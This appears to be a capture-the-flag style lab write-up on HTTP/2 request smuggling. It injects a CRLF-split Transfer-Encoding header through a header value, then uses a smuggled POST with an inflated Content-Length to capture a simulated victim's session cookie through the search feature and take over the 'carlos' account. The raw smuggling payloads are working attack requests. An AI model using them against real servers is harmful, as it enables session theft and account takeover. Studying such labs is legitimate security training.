
The catch here is that HTTP/2 messages are binary rather than text-based, so the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters.

This means that `\r\n` no longer has any value, and can be included inside the value without causing any splitting.

When the request is rewritten as HTTP/1 request, then `\r\n` will be interpreted as a header delimiter.

For example:

```HTTP/2
Foo: bar\nTransfer-Encoding: chunked
```

```HTTP/1
Foo: bar
Transfer-Encoding: chunked
```

## CLFR Exploitation

The goal is to use CLFR vulnerability to gain access to another user's account. The victim accesses the home page every 15 seconds.

First let's capture the root request and send that to repeater. Change the method to `POST` and remove the unnecessary headers.

In order to verify the vulnerability, let's add the `Transfer-Encoding: chunked` but in the same line with another header, so the frontend will not see it.

`Foo: Bar\r\nTransfer-Encoding: chunked`

So the request will be:

```HTTP/2
...
Foo: Bar\r\nTransfer-Encoding: chunked

0

GET /dajlshdalked HTTP/1.1
X-Ignore: x
```

Always make sure that there will not be `\r\n` after the X-Ignore: x, as this will not allow the correct append of the victim's request.

When I send this, and then a normal request, I got a `404` meaning that the vulnerability is present.

Response
```http
HTTP/2 404 Not Found
```

Now, to exploit and gain access to the victim's account. For, this I will target its cookie.

In the main page, there is a search function, and if I search for something, that is stored in the "Recent searches", so I will use this to gain access to the victim's account.

![](../../../../images/Pasted_image_20250116112611.png)

I modify my attack request in a way that the `Content-Length` is much longer than the actual body.

```http
...
Foo: Bar\r\nTransfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a7a004804d6a19f80d6402b00bd0047.web-security-academy.net
Cookie: session=9QjWxUhrPKWLuxEXqD6HwnMDzlhrRNTj;
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

search=halilWashere
```

When I send this, a couple of times, as the victim visits the page every 15 seconds, the request of the victim will be appended to my search query. 

And I see that I have extracted the request, and there is also the cookie.
![](../../../../images/Pasted_image_20250116113108.png)

When I put this account's Cookie in Burp, I gain access to the `carlos` account.

![](../../../../images/Pasted_image_20250116113425.png)